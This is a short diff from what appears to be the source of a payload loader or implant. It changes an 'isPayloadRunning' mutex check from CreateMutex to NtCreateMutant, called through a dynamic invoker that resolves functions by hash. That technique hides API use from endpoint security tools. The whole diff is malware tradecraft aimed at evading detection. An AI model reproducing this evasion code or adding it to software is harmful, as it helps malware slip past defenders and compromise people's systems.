@@ -412,9 +412,23 @@ NTSTATUS AllocateMem(LPVOID* lpMem, PSIZE_T size) {
 }
 
 BOOLEAN isPayloadRunning() {
-	// NtCreateMutant
-	HANDLE hSync = CreateMutex(NULL, TRUE, L"Global\\Sync");
-	if(GetLastError() == ERROR_ALREADY_EXISTS) {
+	
+	HANDLE hMutex = NULL;
+	OBJECT_ATTRIBUTES objAttr = {0};
+	UNICODE_STRING uMutexName = {0};
+	dynamicInvoker.Invoke<NTSTATUS>(RtlInitUnicodeStringStruct.funcAddr, RtlInitUnicodeStringStruct.funcHash,
+		&uMutexName, L"\\BaseNamedObjects\\Sync");
+	objAttr.ObjectName = &uMutexName;
+	objAttr.Attributes = 0x00000040L; // OBJ_CASE_INSENSITIVE
+	objAttr.SecurityDescriptor = NULL;
+	objAttr.SecurityQualityOfService = NULL;
+	objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
+
+
+	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtCreateMutantStruct.funcAddr, NtCreateMutantStruct.funcHash,
+		&hMutex, 0x1F0001, &objAttr, TRUE);
+
+	if(status < 0) { // not STATUS_SUCCESS
 		return TRUE;
 	}
 	return FALSE;
